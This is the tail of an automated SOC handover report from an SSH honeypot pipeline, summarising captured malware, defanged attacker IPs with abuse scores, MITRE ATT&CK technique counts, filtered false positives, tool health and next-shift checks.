| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `220.134.94[.]17` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 20 |
| `138.84.41[.]136` | CO | Starlink Colombia S.A.S. | **100** ⚠️ | 3 |
| `42.200.78[.]166` | HK | Hong Kong Telecommunications (HKT) Limited Business Internet | **100** ⚠️ | 4 |
| `14.248.82[.]58` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 15 |
| `120.48.144[.]5` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 35 |
| `221.226.31[.]137` | CN | CHINANET jiangsu province network | **100** ⚠️ | 11 |
| `181.45.193[.]221` | AR | Telecentro S.A. | **100** ⚠️ | 9 |
| `116.193.190[.]100` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `176.65.148[.]127` | NL | Pfcloud UG | **100** ⚠️ | 50 |
| `106.12.161[.]149` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 335 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 140 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 128 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 66 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 66 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 343 cases |
| Tool 34  | Credential Extractor        | ✅ 269 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (0.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 128 priority case(s) shown individually · 19 recon entry/entries in table (8 group(s) consolidating 201 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-19T07:44:23Z_
